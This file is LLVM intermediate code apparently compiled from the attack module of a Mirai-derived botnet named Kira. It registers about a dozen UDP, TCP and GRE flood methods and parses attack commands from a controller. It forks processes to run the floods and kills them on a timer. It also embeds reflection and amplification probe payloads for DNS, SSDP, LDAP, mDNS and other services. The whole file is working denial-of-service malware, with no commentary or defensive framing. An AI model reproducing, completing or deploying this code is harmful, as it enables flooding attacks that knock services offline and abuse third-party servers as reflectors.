; ModuleID = 'host/ir_O1/Kira.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [1 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@random_hex.hexs = private unnamed_addr constant [256 x i8] c"\00\01\02\03\04\05\06\07\08\09\0A\0B\0C\0D\0E\0F\10\11\12\13\14\15\16\17\18\19\1A\1B\1C\1D\1E\1F !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\5C]^_`abcdefghijklmnopqrstuvwxyz{|}~\7F\80\81\82\83\84\85\86\87\88\89\8A\8B\8C\8D\8E\8F\90\91\92\93\94\95\96\97\98\99\9A\9B\9C\9D\9E\9F\A0\A1\A2\A3\A4\A5\A6\A7\A8\A9\AA\AB\AC\AD\AE\AF\B0\B1\B2\B3\B4\B5\B6\B7\B8\B9\BA\BB\BC\BD\BE\BF\C0\C1\C2\C3\C4\C5\C6\C7\C8\C9\CA\CB\CC\CD\CE\CF\D0\D1\D2\D3\D4\D5\D6\D7\D8\D9\DA\DB\DC\DD\DE\DF\E0\E1\E2\E3\E4\E5\E6\E7\E8\E9\EA\EB\EC\ED\EE\EF\F0\F1\F2\F3\F4\F5\F6\F7\F8\F9\FA\FB\FC\FD\FE\FF", align 16
@hexPayload = local_unnamed_addr global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@table = common local_unnamed_addr global [41 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -1287662771, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpgeneric)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpvse)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpxmas)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_nudp)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstomp)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_std)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #11
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #11
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #11
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #12
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp eq i8 %16, 0
  br i1 %18, label %.thread80, label %19

; <label>:19:                                     ; preds = %13
  %20 = add i32 %1, -6
  %21 = sext i32 %20 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %19
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #11
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %17, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = load i32, i32* %34, align 4
  %41 = getelementptr inbounds i8, i8* %25, i64 4
  %42 = bitcast i8* %41 to i32*
  store i32 %40, i32* %42, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %43 = icmp eq i8 %16, 1
  br i1 %43, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %58, %.lr.ph88 ]
  %44 = bitcast i8* %.087 to i32*
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 4
  %48 = getelementptr inbounds i8, i8* %.087, i64 5
  %49 = load i8, i8* %47, align 1
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %49, i8* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load i32, i32* %46, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %52, i32* %53, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %54 = bitcast i8* %48 to i32*
  %55 = load i32, i32* %54, align 4
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %55, i32* %56, align 4
  %57 = getelementptr inbounds i8, i8* %.087, i64 9
  %58 = getelementptr inbounds i8, i8* %.087, i64 10
  %59 = load i8, i8* %57, align 1
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %59, i8* %60, align 4
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %61, align 4
  %62 = load i32, i32* %56, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %62, i32* %63, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %64 = add i32 %1, -6
  %65 = mul nsw i32 %17, -5
  %66 = add i32 %64, %65
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %.loopexit81.thread, label %68

; <label>:68:                                     ; preds = %._crit_edge
  %69 = load i8, i8* %scevgep, align 1
  %70 = icmp eq i8 %69, 0
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %68
  %71 = zext i8 %69 to i64
  %72 = tail call noalias i8* @calloc(i64 %71, i64 16) #11
  %73 = bitcast i8* %72 to %struct.attack_option*
  %74 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %75 = add i32 %66, -1
  %76 = zext i8 %69 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %89
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %89 ]
  %.184 = phi i8* [ %74, %.lr.ph.preheader ], [ %95, %89 ]
  %.17583 = phi i32 [ %75, %.lr.ph.preheader ], [ %96, %89 ]
  %77 = icmp eq i32 %.17583, 0
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %.lr.ph
  %79 = load i8, i8* %.184, align 1
  %80 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 1
  store i8 %79, i8* %80, align 8
  %81 = icmp eq i32 %.17583, 1
  br i1 %81, label %.loopexit81.loopexit, label %82

; <label>:82:                                     ; preds = %78
  %83 = getelementptr inbounds i8, i8* %.184, i64 1
  %84 = getelementptr inbounds i8, i8* %.184, i64 2
  %85 = load i8, i8* %83, align 1
  %86 = add i32 %.17583, -2
  %87 = zext i8 %85 to i32
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %.loopexit81.loopexit, label %89

; <label>:89:                                     ; preds = %82
  %90 = add nuw nsw i32 %87, 1
  %91 = zext i32 %90 to i64
  %92 = tail call noalias i8* @calloc(i64 %91, i64 1) #11
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 0
  store i8* %92, i8** %93, align 8
  tail call void @util_memcpy(i8* %92, i8* %84, i32 %87) #11
  %94 = zext i8 %85 to i64
  %95 = getelementptr inbounds i8, i8* %84, i64 %94
  %96 = sub nsw i32 %86, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %97 = icmp slt i64 %indvars.iv.next, %76
  br i1 %97, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %89
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %68
  %.070 = phi %struct.attack_option* [ null, %68 ], [ %73, %.loopexit.loopexit ]
  %98 = tail call i32* @__errno_location() #12
  store i32 0, i32* %98, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %69, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %78, %82
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %73, %.loopexit81.loopexit ]
  %99 = icmp eq i8* %25, null
  br i1 %99, label %100, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %69, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #11
  br label %100

; <label>:100:                                    ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %69, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %101 = icmp eq %struct.attack_option* %.17196, null
  br i1 %101, label %.thread80, label %102

; <label>:102:                                    ; preds = %100
  %103 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %103)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %19, %100, %102
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #11
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #11
  switch i32 %12, label %.preheader [
    i32 -1, label %18
    i32 0, label %19
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i64
  br label %25

; <label>:18:                                     ; preds = %11
  tail call void @exit(i32 0) #13
  unreachable

; <label>:19:                                     ; preds = %11
  %20 = tail call i32 @sleep(i32 %0) #11
  %21 = tail call i32 @getppid() #11
  %22 = tail call i32 @kill(i32 %21, i32 9) #11
  tail call void @exit(i32 0) #13
  unreachable

; <label>:23:                                     ; preds = %25
  %24 = icmp slt i64 %indvars.iv.next, %17
  br i1 %24, label %25, label %.loopexit.loopexit

; <label>:25:                                     ; preds = %.lr.ph, %23
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %23 ]
  %26 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %27 = load %struct.attack_method*, %struct.attack_method** %26, align 8
  %28 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 1
  %29 = load i8, i8* %28, align 8
  %30 = icmp eq i8 %29, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %30, label %31, label %23

; <label>:31:                                     ; preds = %25
  %32 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 0
  %33 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %32, align 8
  tail call void %33(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #11
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %23
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %31
  tail call void @exit(i32 0) #13
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #11
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #11
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #11
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

